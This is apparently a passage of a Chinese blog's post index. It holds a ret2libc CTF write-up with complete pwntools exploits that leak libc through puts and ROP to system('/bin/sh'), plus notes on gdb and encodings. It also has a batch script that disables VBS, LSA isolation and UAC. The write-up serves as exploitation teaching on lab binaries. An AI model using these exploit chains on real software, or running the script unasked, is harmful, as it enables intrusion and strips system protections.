ret2libc3        linux-gate.so.1 (0xf7f3e000)        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7cf2000)        /lib/ld-linux.so.2 (0xf7f40000)\n\n\n发现是 /lib/i386-linux-gnu/libc.so.6 那么我们待会就从这里面拿出即可 因为有个gets函数 所以计算偏移的事我们就不搞了 比较简单没什么可讲的\n然后因为要计算 函数起始地址所以要用到以下指令 拿到程序入口地址为 0x80484d0\n\n(Pwn-py312) (base) ➜  ret2libc3 readelf -h ./ret2libc3ELF Header:  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00   Class:                             ELF32  Data:                              2&#x27;s complement, little endian  Version:                           1 (current)  OS/ABI:                            UNIX - System V  ABI Version:                       0  Type:                              EXEC (Executable file)  Machine:                           Intel 80386  Version:                           0x1  Entry point address:               0x80484d0  Start of program headers:          52 (bytes into file)  Start of section headers:          6436 (bytes into file)  Flags:                             0x0  Size of this header:               52 (bytes)  Size of program headers:           32 (bytes)  Number of program headers:         9  Size of section headers:           40 (bytes)  Number of section headers:         35  Section header string table index: 32\n\n\n之后我们可以去写 exp了如下所示\n\nfrom pwn import*p = process(&quot;ret2libc3&quot;)e = ELF(&quot;ret2libc3&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)puts_plt = e.plt[&#x27;puts&#x27;]puts_got = e.got[&#x27;puts&#x27;]start_addr = e.symbols[&#x27;_start&#x27;] #程序的起始地址payload = flat([b&#x27;a&#x27; * 112, puts_plt, start_addr, puts_got]) p.sendlineafter(&quot;Can you find it !?&quot;,payload)puts_real_addr = u32(p.recv()[0:4])  #接收puts的真实地址，占4个字节print(&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;.format(hex(puts_plt),hex(puts_got), hex(start_addr)))print(&quot;puts_real_addr: &quot;, hex(puts_real_addr)) # 计算 puts 在libc中的偏移值libc_puts_addr = libc.sym[&#x27;puts&#x27;]print(&quot;libc_puts_addr:&quot;,hex(libc_puts_addr))# 计算libc的基地址 因为开启了 PIE所以每次都不一样 需要写在这里运行一次计算一次libc_real_addr = puts_real_addr -  libc_puts_addrprint(&quot;libc_real_addr:&quot;,hex(libc_real_addr))# 计算 system 在libc中的偏移值libc_sys_addr = libc.sym[&#x27;system&#x27;]sys_addr = libc_real_addr + libc_sys_addrprint(&quot;sys_addr:&quot;,hex(sys_addr))# 计算 /bin/sh 在libc中偏移量libc_bs_addr = next(libc.search(&#x27;/bin/sh&#x27;))bs_addr = next(libc.search(&#x27;/bin/sh&#x27;)) + libc_real_addrprint(&quot;libc_bs_addr:&quot;,hex(bs_addr))payload2 = flat([b&#x27;a&#x27; * 112, sys_addr, 0x11111111, bs_addr])p.sendline(payload2)p.interactive()\n\n\nexp 解释\n\n1.我们现在知道 libc的版本所以直接用 &#x27;ELF()&#x27; 的形式去加载他 后续我们需要获取&#x27;system&#x27;的偏移以及&#x27;/bin/sh&#x27;的偏移2.获取完程序本身的 &#x27;puts&#x27; 函数的 &#x27;plt&#x27; 表和 &#x27;got&#x27;表 我们可以通过调用 &#x27;puts&#x27; 函数的特性去把 &#x27;got&#x27; 表的地址给他泄露出来 方便后续计算偏移 再加上linux的特性延迟导入 我们也必须先执行一遍 &#x27;puts&#x27; 才会有 &#x27;got&#x27; 表的初始化3.之后我们通过获取 &#x27;libc&#x27; 里面的 &#x27;puts&#x27; 函数 我们可以通过 &#x27;puts&#x27; 在程序中的 &#x27;got&#x27; 表的值去计算出 &#x27;libc&#x27; 的基地址 毕竟全是依赖于这个库的4.既然拿到了基地址 那么 只需要获取 &#x27;system&#x27; 的偏移不就可以计算出真正的 &#x27;system&#x27; 函数的地址了 5.&#x27;bin/sh&#x27;的获取方法也是同理6.接着构建栈帧发送&#x27;payload&#x27;即可 因为我们上次&#x27;puts&#x27;的返回地址是程序的入口 相当于又执行了一遍这个程序\n\nret2libc3_x64\n查属性 也是开启了 NX\n\n(Pwn-py312) (base) ➜  ret2libc3 checksec ret2libc_64[*] &#x27;/home/cccccchow/pwn/AAA/山化课程/day04-ret2libc/ret2libc3/ret2libc_64&#x27;    Arch:       amd64-64-little    RELRO:      No RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No\n\n\n查文件属性 动态编译\n\n(Pwn-py312) (base) ➜  ret2libc3 file ret2libc_64ret2libc_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60d15ef4be5c2352730bc0390234cd7780c0f138, for GNU/Linux 3.2.0, not stripped\n\n\n查文件入口 后续要用 或者直接在 gdb 里面 info func 也可以 一般就是 _start\n\n(Pwn-py312) (base) ➜  ret2libc3 readelf -h ret2libc_64ELF Header:  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00   Class:                             ELF64  Data:                              2&#x27;s complement, little endian  Version:                           1 (current)  OS/ABI:                            UNIX - System V  ABI Version:                       0  Type:                              EXEC (Executable file)  Machine:                           Advanced Micro Devices X86-64  Version:                           0x1  Entry point address:               0x401090  Start of program headers:          64 (bytes into file)  Start of section headers:          11616 (bytes into file)  Flags:                             0x0  Size of this header:               64 (bytes)  Size of program headers:           56 (bytes)  Number of program headers:         12  Size of section headers:           64 (bytes)  Number of section headers:         31  Section header string table index: 30\n\n\nIDA分析发现没有 system /bin/sh 之类的 这道题其实跟上道题差不多 唯一不同的就是传递参数的过程了所以我们还需要多弄一步就是 pop rdi 也就是从栈上把数据放到 rdi 寄存器里面 如下所示\n\n(ret2libc_64/ELF/x86_64)&gt; search pop rdi[INFO] Searching for gadgets: pop rdi[INFO] File: ret2libc_640x0000000000401293: pop rdi; ret; \n\n\n然后我们数据就都拿到了 exp如下所示\n\nfrom pwn import *context.log_level = &#x27;debug&#x27;  # 开启调试信息libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)p = process(&quot;./ret2libc_64&quot;)elf = ELF(&quot;./ret2libc_64&quot;)gdb.attach(p,&quot;b *0x401229\\nc&quot;)pop_rdi_ret = 0x401293puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]offset = 40# 构造 payload 泄露 read@gotpayload = b&quot;a&quot; * offsetpayload += p64(pop_rdi_ret)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(main_addr)p.recvuntil(b&quot;Pls Input&quot;)  # 第一次提示p.send(payload)# 只收一行输出（puts 打印 puts 的地址）leak = p.recvline().strip()print(&quot;leak raw:&quot;, leak.hex())# 如果太短，再试一下用 recv(n)if len(leak) &lt; 6:    leak = p.recvn(6)puts_real_addr = u64(leak.ljust(8, b&#x27;\\x00&#x27;))print(&quot;puts_real_addr: &quot;, hex(puts_real_addr))# 用 leak 计算 libc 基址libc_base = puts_real_addr - libc.sym[&#x27;puts&#x27;]print(&quot;libc_base:&quot;, hex(libc_base))system_addr = libc_base + libc.sym[&#x27;system&#x27;]bs_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))print(&quot;system_addr:&quot;,hex(system_addr))print(&quot;bs_addr:&quot;,hex(bs_addr))payload2 =  b&#x27;a&#x27; * offsetpayload2 += p64(0x40101a) #需要添加一个ret，仅仅用于栈平衡payload2 += p64(pop_rdi_ret)payload2 += p64(bs_addr)payload2 += p64(system_addr)payload2 += p64(main_addr)  # system 返回后跳转 main 避免崩溃p.recvuntil(&quot;Pls Input&quot;)p.send(payload2)p.interactive()\n\n\nexp详解\n\n1.我们现在知道 libc的版本所以直接用 &#x27;ELF()&#x27; 的形式去加载他 后续我们需要获取&#x27;system&#x27;的偏移以及&#x27;/bin/sh&#x27;的偏移2.获取完程序本身的 &#x27;puts&#x27; 函数的 &#x27;plt&#x27; 表和 &#x27;got&#x27;表 我们可以通过调用 &#x27;puts&#x27; 函数的特性去把 &#x27;got&#x27; 表的地址给他泄露出来 方便后续计算偏移 再加上linux的特性延迟导入 我们也必须先执行一遍 &#x27;puts&#x27; 才会有 &#x27;got&#x27; 表的初始化3.之后我们通过获取 &#x27;libc&#x27; 里面的 &#x27;puts&#x27; 函数 我们可以通过 &#x27;puts&#x27; 在程序中的 &#x27;got&#x27; 表的值去计算出 &#x27;libc&#x27; 的基地址 毕竟全是依赖于这个库的4.既然拿到了基地址 那么 只需要获取 &#x27;system&#x27; 的偏移不就可以计算出真正的 &#x27;system&#x27; 函数的地址了 5.&#x27;bin/sh&#x27;的获取方法也是同理6.接着构建栈帧发送&#x27;payload&#x27;即可 因为我们上次&#x27;puts&#x27;的返回地址是程序的入口 相当于又执行了一遍这个程序7.但是我们在构造&#x27;payload&#x27;的时候 就不能跟32位程序一样了 必须得是用寄存器传递参数8.最后为什么加了一个&#x27;ret&#x27;来保持堆栈平衡呢?\t(1).x86_64 的函数调用规范要求调用前 rsp 必须是 16 字节对齐的。\t(2).ret2libc 这类利用中，常常发现直接调用 system 会崩溃，因为栈没对齐导致调用约定不满足。\t(3).所以常见套路是用一个短 gadget 做对齐9.以下是用 gdb 调试来看&#x27;rsp&#x27;是否16位对齐\t 0x40128e &lt;__libc_csu_init+005e&gt; pop    r13     0x401290 &lt;__libc_csu_init+0060&gt; pop    r14     0x401292 &lt;__libc_csu_init+0062&gt; pop    r15 →   0x401294 &lt;__libc_csu_init+0064&gt; ret       ↳  0x766564e58750 &lt;system+0000&gt;    endbr64       0x766564e58754 &lt;system+0004&gt;    test   rdi, rdi      0x766564e58757 &lt;system+0007&gt;    je     0x766564e58760 &lt;__libc_system+16&gt;      0x766564e58759 &lt;system+0009&gt;    jmp    0x766564e582d0 &lt;do_system&gt;      0x766564e5875e &lt;system+000e&gt;    xchg   ax, ax      0x766564e58760 &lt;system+0010&gt;    sub    rsp, 0x8─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;ret2libc_64&quot;, stopped 0x401294 in __libc_csu_init (), reason: SINGLE STEP───────────────────────────────────────────────────────────────────── trace ────[#0] 0x401294 → __libc_csu_init()[#1] 0x766564e58750 →  &lt;system+0&gt; endbr64 [#2] 0x401176 → frame_dummy()────────────────────────────────────────────────────────────────────────────────gef➤  i r rsprsp            0x7ffcef704be0      0x7ffcef704be0gef➤  10.判断是否16字节对齐，就是看这个值能不能被16整除，也就是看低4位（十六进制）是否为0：\t(1).16的十六进制是0x10\t(2).计算：0x7fff8b2f8b98 % 0x10\t(3).看低位：0xb98，取最低一位16进制数字，就是 8。\t(4).0x8 ≠ 0x0，说明 不是16字节对齐。\n\n\n\n\n\n总结与思考解决ret2libc这样的题目，关键就是把握两个payload的构建方法，理解如下关键公式的含义即可：\n函数的真实地址 = 基地址 + 偏移地址 \n 最后再次总结一下解题思路：\n1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略，实际题目要用到LibcSearch库）。3.根据libc库的版本可以很容易的确定puts函数的偏移地址。4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。5.根据libc函数的版本，确定system函数和&quot;/bin/sh&quot;字符串在libc库中的偏移地址。 6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和&quot;/bin/sh&quot;字符串的真实地址。7.再次构造合理的payload2，劫持程序的执行流程，劫持到system(&quot;/bin/sh&quot;)的真实地址，从而拿到shell。\n\n\n\n","tags":["pwn"]},{"title":"BASE编码解析","url":"/2025/06/03/BASE%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90/","content":"BASE系列编码\n先将待编码字符按照ASCII编码转换成8bit二进制形式\n再将二进制序列切片组合，重组为若干个等长的二进制组\n将每个二进制组转换成十进制数字，并查表找到对应的可打印ASCII字符\n重组若不足则补0 并将其编码为‘&#x3D;’\n\n\n\n根据分组长度的不同 (4bit、5bit、6bit) 可以分为三种BASE编码形式\n\n4bit base16编码 字母表为 0123456789ABCDEF\n5bit base32编码 字母表为 A-Z 2-7\n6bit base64编码 字母表为 A-Z a-z 0-9 +&#x2F;\n\n示例如下所示\n\n","tags":["编码"]},{"title":"gdb命令使用","url":"/2025/06/05/gdb%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/","content":"在程序编译时增加-g选项以支持gdb调试\n如：\n$ gcc -g example.c -o example.x\n通过上述命令对example.c编译之后，使用下列命令进入到gdb调试：\n$ gdb example.x\n在gdb调试中，常用的命令有以下几个：\n$ list 缩略为 l\n列出程序源码，每次列出10行，按回车重复运行上一命令；\n$ run 缩略为 r\n程序开始运行，在r后可以加入程序启动参数，程序运行到断点处暂停；\n$ continue 缩略为 c\n\n\n程序继续运行，到下一断点处暂停；\n单步调试\n$ step 缩略为s\n$ next 缩略为 n\n程序继续运行到下一断点；\n$ break 缩略为 b\n在程序某一位置设置断点；\n$ info break 缩略为 i b\n查看断点信息；\n设置&#x2F;查看运行参数\n$ set args —&#x2F;show args\n加载运行中的进程进行调试(Attach to the running process to be debugged.)：\n$ gdb attatch pid\nSpecifying source directories\n$ dir dirname …\n以十六进制输出内存块数据\n$ x&#x2F;28hx —\n段错误调试，core文件样例\n通过ulimit命令查看一下系统是否配置支持了dump core的功能。通过ulimit -c或ulimit -a，可以查看core file大小的配置情况，如果为0，则表示系统关闭了dump core；可以通过ulimit -c unlimited来打开。若发生了段错误，但没有core dump，是由于系统禁止core文件的生成。\n$ gdb [exec file] [core file]\n查看堆栈信息：\n$ bt\nPS：对于python程序在linux下可以使用pdb做调试！\nPublished by Windows Livewriter.\n调试开始时，必须先载入要进行调试的程序，可以用以下两种方式：\n　* 在启动gdb后执行以下命令：\n　　　file 可执行文件路径\n　* 在gdb启动时就载入程序：\n　　　gdb 可执行文件路径\n载入程序后，接下来就是要进行断点的设置，要监视的变量的添加等工作，下面对在这个过程中常会用到的命令逐一进行介绍：\n　* list ：显示程序中的代码，常用使用格式有：\n　　　　list\n　　　　　　输出从上次调用list命令开始往后的10行程序代码。\n　　　　list -\n　　　　　　输出从上次调用list命令开始往前的10行程序代码。\n　　　　list n\n　　　　　　输出第n行附近的10行程序代码。\n　　　　list function\n　　　　　　输出函数function前后的10行程序代码。\n　* forward&#x2F;search ：从当前行向后查找匹配某个字符串的程序行。使用格式：\n　　　　forward&#x2F;search 字符串\n　　查找到的行号将保存在$_变量中，可以用print $_命令来查看。\n　* reverse-search ：和forward&#x2F;search相反，向前查找字符串。使用格式同上。\n　* break ：在程序中设置断点，当程序运行到指定行上时，会暂停执行。使用格式：\n　　　　break 要设置断点的行号\n　* tbreak ：设置临时断点，在设置之后只起作用一次。使用格式：\n　　　　tbreak 要设置临时断点的行号\n　* clear ：和break相反，clear用于清除断点。使用格式：\n　　　　clear 要清除的断点所在的行号\n　* run ：启动程序，在run后面带上参数可以传递给正在调试的程序。\n　* awatch ：用来增加一个观察点(add watch)，使用格式：\n　　　　awatch 变量或表达式\n　　当表达式的值发生改变或表达式的值被读取时，程序就会停止运行。\n　* watch ：与awatch类似用来设置观察点，但程序只有当表达式的值发生改变时才会停止运行。使用格 式：\n　　　　watch 变量或表达式\n　　需要注意的是，awatch和watch都必须在程序运行的过程中设置观察点，即可运行run之后才能设置。\n　*** commands ：设置在遇到断点后执行特定的指令。**使用格式有：\n　　　　commands\n　　　　　　设置遇到最后一个遇到的断点时要执行的命令\n　　　　commands n\n　　　　　　设置遇到断点号n时要执行的命令\n　　注意，commands后面跟的是断点号，而不是断点所在的行号。\n　　在输入命令后，就可以输入遇到断点后要执行的命令，每行一条命令，在输入最后一条命令后输入end就可以结束输入。\n　* delete ：清除断点或自动显示的表达式。使用格式：\n　　　　delete 断点号\n　* disable ：让指定断点失效。使用格式：\n　　　　disable 断点号列表\n　　断点号之间用空格间隔开。\n　* enable ：和disable相反，恢复失效的断点。使用格式：\n　　　　enable 断点编号列表\n　* ignore ：忽略断点。使用格式：\n　　　　ignore 断点号 忽略次数\n　* condition ：设置断点在一定条件下才能生效。使用格式：\n　　　　condition 断点号 条件表达式\n　* cont&#x2F;continue ：使程序在暂停在断点之后继续运行。使用格式：\n　　　　cont\n　　　　　　跳过当前断点继续运行。\n　　　　cont n\n　　　　　　跳过n次断点，继续运行。\n　　当n为1时，cont 1即为cont。\n　* jump ：让程序跳到指定行开始调试。使用格式：\n　　　　jump 行号\n　*** next ：继续执行语句，但是跳过子程序的调用**。使用格式：\n　　　　next\n　　　　　　执行一条语句\n　　　　next n\n　　　　　　执行n条语句\n　* nexti ：单步执行语句，但和next不同的是，它会跟踪到子程序的内部，但不打印出子程序内部的语句。使用格式同上。\n　* step ：与next类似，但是它会跟踪到子程序的内部，而且会显示子程序内部的执行情况。使用格式同上。\n　* stepi ：与step类似，但是比step更详细，是nexti和step的结合。使用格式同上。\n　* whatis ：显示某个变量或表达式的数据类型。使用格式：\n　　　　whatis 变量或表达式\n　* ptype ：和whatis类似，用于显示数据类型，但是它还可以显示typedef定义的类型等。使用格式：\n　　　　ptype 变量或表达式\n　* set ：设置程序中变量的值。使用格式：\n　　　　set 变量&#x3D;表达式\n　　　　set 变量:&#x3D;表达式\n　* display ：增加要显示值的表达式。使用格式：\n　　　　display 表达式\n　* info display ：显示当前所有的要显示值的表达式。\n　* delete display&#x2F;undisplay ：删除要显示值的表达式。使用格式：\n　　　　delete display&#x2F;undisplay 表达式编号\n　* disable display ：暂时不显示一个要表达式的值。使用格式：\n　　　　disable display 表达式编号\n　* enable display ：与disable display相反，使用表达式恢复显示。使用格式：\n　　　　enable display 表达式编号\n　*** print ：打印变量或表达式的值。**使用格式：\n　　　　print 变量或表达式\n　　表达式中有两个符号有特殊含义：$和$$。\n　　$表示给定序号的前一个序号，$$表示给定序号的前两个序号。\n　　如果$和$$后面不带数字，则给定序号为当前序号。\n　* backtrace ：打印指定个数的栈帧(stack frame)。使用格式：\n　　　　backtrace 栈帧个数\n　* frame ：打印栈帧。使用格式：\n　　　　frame 栈帧号\n　* info frame ：显示当前栈帧的详细信息。\n　* select-frame ：选择栈帧，选择后可以用info frame来显示栈帧信息。使用格式：\n　　　　select-frame 栈帧号\n\nkill ：结束当前程序的调试。　* quit ：退出gdb。\n\n查看内存x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; \nn、f、u是可选的参数。\nn 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。f 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是s，如果地十是指令地址，那么格式可以是i。u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。\n表示一个内存地址。n&#x2F;f&#x2F;u三个参数可以一起使用。例如：\n命令：x&#x2F;3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示三个单位，u表示按十六进制显示。\n输出格式一般来说，GDB会根据变量的类型输出变量的值。但你也可以自定义GDB的输出的格式。例如，你想输出一个整数的十六进制，或是二进制来查看这个整型变量的中的位的情况。要做到这样，你可以使用GDB的数据显示格式：\nx 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十六进制格式显示无符号整型。o 按八进制格式显示变量。t 按二进制格式显示变量。a 按十六进制格式显示变量。c 按字符格式显示变量。\ns 按字符串格式显示变量\nf 按浮点数格式显示变量。\n(gdb) p i$21 &#x3D; 101\n(gdb) p&#x2F;a i$22 &#x3D; 0x65\n(gdb) p&#x2F;c i$23 &#x3D; 101 ‘e’\n(gdb) p&#x2F;f i$24 &#x3D; 1.41531145e-43\n(gdb) p&#x2F;x i$25 &#x3D; 0x65\n(gdb) p&#x2F;t i$26 &#x3D; 1100101\n日志等级pwntools 如何设置调试等级（日志等级）pwntools 使用 context.log_level 来设置日志输出的详细程度。\n✨ 常用 log_level 选项：\n\n\n等级\n描述\n\n\n\n&#39;debug&#39;\n输出详细调试信息（最常用）\n\n\n&#39;info&#39;\n默认，适合一般情况\n\n\n&#39;warn&#39;\n只输出警告信息\n\n\n&#39;error&#39;\n只输出错误信息\n\n\n&#39;critical&#39;\n只输出最严重的错误\n\n\n&#39;silent&#39;\n不输出任何日志\n\n\n📌 示例：from pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./b0verfl0w&#x27;)\n\n这会让 pwntools 输出所有发送的 payload、IO、GDB 附加信息等，非常适合调试阶段使用。\nfinish 执行到函数返回如果你想直接断在返回指令处，先 disas vuln 找到 ret 的地址，再设置断点：\n"},{"title":"关于CheatEngine提示DBVM无法启动以及VMware提示此平台不支持虚拟化的解决方案","url":"/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","content":"环境\nwindows11 24h2 其它系统应该是通用\n\n步骤1\n首先打开控制面板-程序-启动或关闭Windows功能 像这样关闭这些:\n\n\n然后再找到服务禁用以下功能\n\n\n\n   \n\n之后再设置里面搜索内核隔离然后把内核隔离的所有选项关闭\n\n\n重启电脑尝试即可 若还是不行请看步骤2\n\n\n步骤2 [来自](VMware Workstation：如何解决打开虚拟机出现“此平台不支持虚拟化的Intel VT-x&#x2F;EPT”的报错问题 - VM技术库)运行msinfo32.exe命令，确认Windows 11的宿主机是否开启了VBS，如果”基于虚拟化的安全“那一行后面显示是“未启用”，本文内容不适合。如果显示“正在运行”，请继续第2步。\n\n之后执行以下脚本 写出一个bat文件即可 记得要管理员运行\n@echo offdism /Online /Disable-Feature:microsoft-hyper-v-all /NoRestartdism /Online /Disable-Feature:IsolatedUserMode /NoRestartdism /Online /Disable-Feature:Microsoft-Hyper-V-Hypervisor /NoRestartdism /Online /Disable-Feature:Microsoft-Hyper-V-Online /NoRestartdism /Online /Disable-Feature:HypervisorPlatform /NoRestartREM ===========================================mountvol X: /scopy %WINDIR%\\System32\\SecConfig.efi X:\\EFI\\Microsoft\\Boot\\SecConfig.efi /Ybcdedit /create &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; /d &quot;DebugTool&quot; /application osloaderbcdedit /set &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; path &quot;\\EFI\\Microsoft\\Boot\\SecConfig.efi&quot;bcdedit /set &#123;bootmgr&#125; bootsequence &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125;bcdedit /set &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; loadoptions DISABLE-LSA-ISO,DISABLE-VBSbcdedit /set &#123;0cb3b571-2f2e-4343-a879-d86a476d7215&#125; device partition=X:mountvol X: /dbcdedit /set hypervisorlaunchtype offREG DELETE HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard /v EnableVirtualizationBasedSecurity /fecho 关闭UAC通知reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System&quot; /f /v &quot;EnableLUA&quot; /t REG_DWORD /d 0reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Security Center&quot; /f /v &quot;UacDisableNotify&quot; /t REG_DWORD /d 1echo.echo.echo.echo.echo 接下来！重新启动您的电脑！完成剩下的操作。echo 请注意！重启时的屏幕提示！echo 请重启！过了BIos自检之后！看到黑白字符提示你按键的时候echo 请死按，狂按 F3键，自动重启为止！!echo 可以关闭此窗口了，重启电脑吧。。。pause &gt; nulecho.echo.\n\n这样就是成功了 亲测有效 脚本没问题 本人也是被这个问题困扰了很久很久\n\n"},{"title":"编码","url":"/2025/05/29/%E7%BC%96%E7%A0%81/","content":"编码ASCII编码\n使用一个字节来表示字符串中的字符，称为ANSI字符串。\nASCII（American Standard Code for Information Interchange）是 美国信息交换标准代码，它使用 7 位 来表示一个字符，共定义了 128 个字符，范围是 0 ~ 127，包括：\n英文字母（AZ，az）\n数字（0~9）\n标点符号（如 !、,、. 等）\n控制字符（如换行符 \\n，回车 \\r）\n2. 在 C 语言中的表现#include &lt;stdio.h&gt;int main() &#123;    char c = &#x27;A&#x27;;         // 字符A的ASCII值是65    printf(&quot;字符: %c, ASCII码: %d\\n&quot;, c, c);    return 0;&#125;\n\n输出：\n字符: A, ASCII码: 65\n\n\n\nUnicode编码(双字节)\nUnicode是继ASCII字符编码后的另一种新型字符编码。严格意义上讲，ASCII码的每个字符使用7位表示Unicode则使用全16位表示一个字符。Unicode字符串中的每个字符均为双字节，所以又称为宽字符串。由于Unicode兼容ASCII字符，所以被大多数程序所支持，如Windows内核。Unicode的前128个字符码（十六进制，0x00000x007F）同ASCII码具有同样的字节值。比如，字母“a”的Unicode编码是0x0061，而“a”的ASCII编码是0x61。虽然占用的字节数不一样，但是两者的值是一样的。接下来的128个Unicode字符（代码为0x00800x00FF)是ISO8859-1对ASCII码的扩展。中国、日本和韩国的象形文字（总称为CJK）占用了0x3000~0x9FFF的代码。如“汉”字的Unicode编码是6C49h（其GB码为0BABAh)。 Unicode字符串不像ANSI字符串那样，保证用字符“\\0”结束；如果开发者在程序设计时以字符“\\0”作为Unicode字符串结尾的判断条件，就可能发生错误。\n在汇编语言中，Unicode字符串被定义为一个结构体，它的定义如下：\ntypedef struct _UNICODE_STRING &#123;  USHORT Length;\t\t\t//字符串长度  USHORT MaximumLength;\t\t//字符串缓冲区长度  PWSTR  Buffer;\t\t\t//字符串缓冲区&#125; UNICODE_STRING, *PUNICODE_STRING;\n\n由于我们无法保证Unicode字符串结尾一定是“\\0”，所以在结构体中，字段Length定义了字符串的长度。一个安全的字符串还必须限定字符的总长度，这由MaximumLength来实现。\n\nUTF-8、UTF-16、UTF-32 是 Unicode 的编码方式\nUTF-8：多字节，1~4 字节\nUTF-16：2 或 4 字节\nUTF-32：固定 4 字节（效率低，体积大）\n\n\n\nC 语言中的示例对比✅ Unicode 码点的概念（逻辑编号）#include &lt;wchar.h&gt;#include &lt;locale.h&gt;#include &lt;stdio.h&gt;int main() &#123;    setlocale(LC_ALL, &quot;&quot;);    wchar_t ch = L&#x27;你&#x27;;    wprintf(L&quot;字符: %lc, Unicode码点: U+%04X\\n&quot;, ch, ch);    return 0;&#125;\n\n输出（在 UTF-8 环境中）：\n字符: 你, Unicode码点: U+4F60\n多字节编码\n多字节编码一般都是在 ASCII 的基础上进行扩展或兼容设计的。\n🔷 一、为什么基于 ASCII 扩展？✅ 兼容性原则早期的系统、程序、协议都是基于 ASCII 设计的，为了不打破已有的英文文本和软件兼容性，后来设计的多字节编码（如 GBK、UTF-8）都：\n\n保留 ASCII 范围（0x00 ~ 0x7F）作为单字节直接使用\n超出 ASCII 的字符才用 多个字节组合表示\n\n\n🔷 二、是如何在 ASCII 基础上扩展的？1. ASCII 基本规则\n\n\n字符\n二进制（7位）\n十六进制\n\n\n\nA\n01000001\n0x41\n\n\nz\n01111010\n0x7A\n\n\n空格\n00100000\n0x20\n\n\n\n所有 ASCII 字符的最高位（第8位）都是 0\n\n\n2. 多字节编码（如 UTF-8）的扩展方式UTF-8 保证：\n\n0xxxxxxx 表示 ASCII → 保留单字节（最高位为 0）\n非 ASCII → 多字节以 1xxxxxxx 开头（高位 1）\n\nUTF-8 编码示意：\n\n\n编码字节数\n前缀规则\n可表示的字符范围\n\n\n\n1字节\n0xxxxxxx\nASCII（U+0000 ~ U+007F）\n\n\n2字节\n110xxxxx 10xxxxxx\nU+0080 ~ U+07FF\n\n\n3字节\n1110xxxx 10xxxxxx 10xxxxxx\nU+0800 ~ U+FFFF\n\n\n示例：“你” 字：Unicode &#x3D; U+4F60 UTF-8 编码 → 0xE4 0xBD 0xA0\n\n3. GBK 等编码也是类似原则GBK：\n\nASCII：0x00~0x7F，单字节直接使用\n中文：0x81~0xFE 开头的多字节组合\n\n示例：\n\n\n字符\nGBK 编码\n\n\n\nA\n0x41\n\n\n“你”\n0xC4 0xE3\n\n\n\n🔷 三、可视化对比diff复制编辑+----------------------+------------------------+| ASCII                |  0x41 (A), 0x61 (a)    |+----------------------+------------------------+| UTF-8                |  A -&gt; 0x41             ||                      |  你 -&gt; 0xE4 0xBD 0xA0  |+----------------------+------------------------+| GBK                  |  A -&gt; 0x41             ||                      |  你 -&gt; 0xC4 0xE3       |+----------------------+------------------------+\n\n✅ 结论：\n\n多字节编码不会破坏 ASCII 表示方式，而是在此基础上扩展更高位字符。\n\n\n🔷 四、C 语言验证例子：ASCII + 多字节输出c复制编辑#include &lt;stdio.h&gt;int main() &#123;    char *ascii = &quot;A&quot;;     // ASCII 单字节    char *utf8 = &quot;你&quot;;     // UTF-8 多字节    printf(&quot;ASCII 字符: %s\\n&quot;, ascii);    printf(&quot;UTF-8 字符: %s\\n&quot;, utf8);    printf(&quot;UTF-8 字节: &quot;);    for (int i = 0; utf8[i] != &#x27;\\0&#x27;; i++) &#123;        printf(&quot;%02X &quot;, (unsigned char)utf8[i]);    &#125;    printf(&quot;\\n&quot;);    return 0;&#125;\n\n输出：\nless复制编辑ASCII 字符: AUTF-8 字符: 你UTF-8 字节: E4 BD A0\n\n\n🔷 五、总结一句话\n多字节编码方案（如 UTF-8、GBK）都是在 ASCII 基础上添加高字节区域来扩展更多语言字符，同时保持对 ASCII 